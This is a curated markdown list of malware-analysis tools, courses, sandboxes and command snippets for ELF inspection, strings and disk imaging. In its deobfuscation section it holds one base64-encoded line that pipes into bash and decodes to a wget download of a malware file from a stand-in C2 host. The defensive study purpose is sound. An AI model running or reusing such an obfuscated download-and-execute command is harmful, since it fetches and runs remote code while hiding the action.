# Malware Analysis

- [BlobRunner](https://github.com/OALabs/BlobRunner) - Quickly debug shellcode extracted during malware analysis.
- [Dangerzone](https://github.com/firstlookmedia/dangerzone) - Take potentially dangerous PDFs, office documents, or images and convert them to a safe PDF.
- [emnux-a-tool-for-reverse-engineering-malware](https://infoupdatesection.wordpress.com/2017/04/08/remnux-a-tool-for-reverse-engineering-malware/)
- [elf-malware-analysis-101-initial-analysis](https://www.intezer.com/blog/linux/elf-malware-analysis-101-initial-analysis/)
- [Awesome Malware Analysis](https://github.com/rshipp/awesome-malware-analysis#honeypots)
- [CyberChef](https://github.com/gchq/cyberchef) - The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.
  - [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)
- [DrSemu](https://github.com/secrary/DrSemu) - Sandboxed Malware Detection and Classification Tool Based on Dynamic Behavior.
- [HashDB](https://github.com/OALabs/hashdb) - Assortment of hashing algorithms used in malware.
- [Malduck](https://github.com/CERT-Polska/malduck) - ðŸ¦† Malduck is your ducky companion in malware analysis journeys.
  - [Learn how to fix PE magic numbers with Malduck](https://0xc0decafe.com/fix-pe-magic-numbers-with-malduck/)
- [Malware-gems](https://github.com/0x4143/malware-gems) - A not so awesome list of malware gems for aspiring malware analysts.
- [SSMA](https://github.com/secrary/SSMA) - Simple Static Malware Analyzer [This project is not maintained anymore]
- [Qu1cksc0pe](https://github.com/CYB3RMX/Qu1cksc0pe) - All-in-One malware analysis tool. This tool allows you to statically analyze Windows, Linux, OSX executables and APK files.

## Collections of good materials (pdfs, tutorials and so on)
- [Complete Malware Analysis Tutorials, Cheatsheet](https://gbhackers.com/malware-analysis-cheat-sheet-and-tools-list/)A Complete Malware Analysis Tutorials, Cheatsheet & Tools list for Security Professionals.
- [Malware Analysis - CSCI 4976](https://github.com/RPISEC/Malware) - Course materials for Malware Analysis by RPISEC.
- [Modern Binary Exploitation - CSCI 4968](https://github.com/RPISEC/MBE) - Course materials for Modern Binary Exploitation by RPISEC.
- [PMAT-labs](https://github.com/HuskyHacks/PMAT-labs) - Labs for Practical Malware Analysis & Triage.

## Compression
- [aPLib](https://ibsensoftware.com/products_aPLib.html) - compression library.
  - [The malware analystâ€™s guide to aPLib decompression](https://0xc0decafe.com/malware-analysts-guide-to-aplib-decompression/)

## Decryption and Deobfuscation
- [Binary Refinery](https://github.com/binref/refinery) - High Octane Triage Analysis.
#### base64
````
echo d2dldCBodHRwOi8vc29tZW5vbmV4aXRpbmdjbmNbLl1jb20vbWFsd2FyZS5hcHA=|base64 -d |bash;
````
## Diff
- [VBinDiff - Visual Binary Diff](https://github.com/madsen/vbindiff) - Visual Binary Diff (VBinDiff) displays files in hex & ASCII and can highlight the differences between 2 files.

## Disk Image
````powershell
dd if=/dev/sda3 of=$IMAGE_FILE
mount -o loop,ro $IMAGE_FILE /mnt
````

## Entropy
- [read later](https://reverseengineering.stackexchange.com/questions/21555/what-is-an-entropy-graph/21558)

## Frameworks and other analysis systems
- [Analyzer](https://github.com/qeeqbox/analyzer) - â˜£ï¸ Offline Analyzer for extracting and visualizing features, artifacts and IoCs from files and memory dumps (Windows, Linux, Android, iPhone, Blackberry, macOS binaries, emails and more).
- [Detect It Easy (DIE) tool](https://ntinfo.biz/index.html) - DIE is a signature-based tool that detects a fileâ€™s compiler, linker, packer, and more.
- [DRAKVUF Sandbox](https://github.com/CERT-Polska/drakvuf-sandbox) - DRAKVUF Sandbox - automated hypervisor-level malware analysis system.
- [Hybrid-Analysis](https://www.hybrid-analysis.com) - free malware analysis service for the community that detects and analyzes unknown threats using a unique Hybrid Analysis technology.
- [Karton](https://github.com/CERT-Polska/karton) - Distributed malware processing framework based on Python, Redis and MinIO.
  - [Karton : Distributed Malware Processing Framework Based On Python, Redis And MinIO](https://kalilinuxtutorials.com/karton)
- [Koodous](https://koodous.com)
- [Malwoverview](https://github.com/alexandreborges/malwoverview) - Malwoverview is a first response tool used for threat hunting and offers intel information from Virus Total, Hybrid Analysis, URLHaus, Polyswarm, Malshare, Alien Vault, Malpedia, ThreatCrowd, Valhalla, Malware Bazaar, ThreatFox, Triage and it is able to scan Android devices against VT and HA.
- [Virustotal](virustotal.com) - Analyze suspicious files and URLs to detect types of malware, automatically share them with the security community 
  ### Selfhosted
  - [Cuckoo](https://github.com/cuckoosandbox/cuckoo) - Cuckoo Sandbox is an automated dynamic malware analysis system 


## DNS
- [MINI-DNS-Server](https://github.com/alexsilva/MINI-DNS-Server) - Resolve domain names and saves the ips in a database (cache). 

## Elf - Executable and Linkable Format
- Formats: so, o, elf, puff, ko, mod, bin, axf, prx or none
- [ELFkickers](https://github.com/BR903/ELFkickers) - A collection of programs that access and manipulate ELF files.
- [Extracting Linux ELF binaries](https://github.com/extremecoders-re/pyinstxtractor/wiki/Extracting-Linux-ELF-binaries) - Pyinstxtractor as of now can natively extract Pyinstaller generated ELF binaries (in the same way as Windows exe) without requiring additional tools.
- [Extrude](https://github.com/liamg/extrude) - ðŸ•µï¸ Analyse binaries for missing security features, information disclosure and more...
- [hacking_whale](https://github.com/oneNutW0nder/hacking_whale) - Custom Docker image used for debugging and pwning x86/x86_64 ELFs.
- [M0der_p4cker](https://github.com/n4sm/m0dern_p4cker) - Just a modern packer for elf binaries ( works on linux executables only ) 
- [XELFViewer](https://github.com/horsicq/XELFViewer) - ELF file viewer/editor for Windows, Linux and MacOS.
````
ldd                                           #displays libraries used
ldd /bin/executable
readelf
readelf /bin/executable                       #displays info about ELF files
readelf -h training-sample                    #ELF Header
readelf -s training-sample
readelf -s training-sample | grep OBJECT
readelf -s training-sample | grep FUNC
readelf -s training-sample | grep FILE
````

## Fuzzy hashing
- [SSDeep](https://github.com/ssdeep-project/ssdeep) - Fuzzy hashing API and fuzzy hashing tool . [ssdeep-project.github.io](https://ssdeep-project.github.io/ssdeep/index.html)

## Images
Exif - _Exchangeable image file format (officially Exif, according to JEIDA/JEITA/CIPA specifications) is a standard that specifies the formats for images, sound, and ancillary tags used by digital cameras (including smartphones), scanners and other systems handling image and sound files recorded by digital cameras. [Wiki Exif](https://en.wikipedia.org/wiki/Exif)_
- [ExifTool](https://exiftool.org)
````powershell
 exiftool IMG.CR2
````

## Network Traffic Analysis
- [flare-fakenet-ng](https://github.com/fireeye/flare-fakenet-ng) - Next Generation Dynamic Network Analysis Tool.
- [Netsniff-ng](https://github.com/netsniff-ng/netsniff-ng) - A Swiss army knife for your daily Linux network plumbing.
- [NetworkMiner](https://www.netresec.com/?page=Networkminer) - open source Network Forensic Analysis Tool (NFAT) for Windows (but also works in Linux / Mac OS X / FreeBSD).
- [Pcap files and malware samples](https://malware-traffic-analysis.net) - Since the summer of 2013, this site has published over 1,600 blog entries about malicious network traffic.  Almost every post on this site has pcap files or malware samples (or both).

## Setup
- [DetectionLab](https://github.com/clong/DetectionLab) - Automate the creation of a lab environment complete with security tooling and logging best practices.

### Operating Systems
- [FireEye's ThreatPursuit-VM](https://github.com/fireeye/ThreatPursuit-VM) - A fully customizable, open-sourced Windows-based distribution focused on threat intelligence analysis and hunting designed for intel and malware analysts as well as threat hunters to get up and running quickly.
- [Flare-vm](https://github.com/fireeye/flare-vm) - a fully customizable, Windows-based security distribution for malware analysis, incident response, penetration testing, etc.
  - [Installation](https://www.fireeye.com/blog/threat-research/2018/11/flare-vm-update.html)
- [REMnux](https://remnux.org) - REMnuxÂ® is a Linux toolkit for reverse-engineering and analyzing malicious software. REMnux provides a curated collection of free tools created by the community. Analysts can use it to investigate malware without having to find, install, and configure the tools. Lots of tools in /opt/ folder.
- [Santoku Linux](https://github.com/santoku/Santoku-Linux) - _Linux Distro for Mobile Security, Malware Analysis, and Forensics [santoku-linux.com](https://santoku-linux.com)._

## Strings
Commands
````
strings training-sample > str.txt
strings -w maliciousfile.o | less
sudo strings /dev/mem | less
````
- [AMSITrigger](https://github.com/RythmStick/AMSITrigger) - The Hunt for Malicious Strings.

## Tutorials and practise
- [Malware-traffic-analysis.net](https://malware-traffic-analysis.net) - A source for pcap files and malware samples.
- [Php-malware-analysis by bediger4000](https://github.com/bediger4000/php-malware-analysis) - Deobfuscation and analysis of PHP malware captured by a WordPress honey pot.
- [Reverse-php-malware ProTechEx](https://github.com/ProTechEx/reverse-php-malware) - An aid to de-obfuscating PHP malware.
- [Volume 0x1: Analysis](https://taomm.org/vol1/pdfs.html)
- [Wireshark Tutorial: Examining Traffic from Hancitor Infections](https://unit42.paloaltonetworks.com/wireshark-tutorial-hancitor-followup-malware/)
-  [pan-unit42 - wireshark-tutorial-Hancitor-traffic](https://github.com/pan-unit42/wireshark-tutorial-Hancitor-traffic) -  zip archives of pcaps for Wireshark tutorial about examining Hancitor infection traffic. Password is `infected`.

## Packers and Unpackers
- [Python-exe-unpacker](https://github.com/countercept/python-exe-unpacker) - A helper script for unpacking and decompiling EXEs compiled from python code. 
- [Unpacker Karton Service](https://github.com/c3rb3ru5d3d53c/karton-unpacker) - A modular Karton Framework service that unpacks common packers like UPX and others using the Qiling Framework. 
- [UPX](https://github.com/upx/upx) - UPX - the Ultimate Packer for eXecutables.

## VMware
- [VMwareCloak](https://github.com/d4rksystem/VMwareCloak) - A PowerShell script that attempts to help malware analysts hide their VMware Windows VM's from malware that may be trying to evade analysis. 
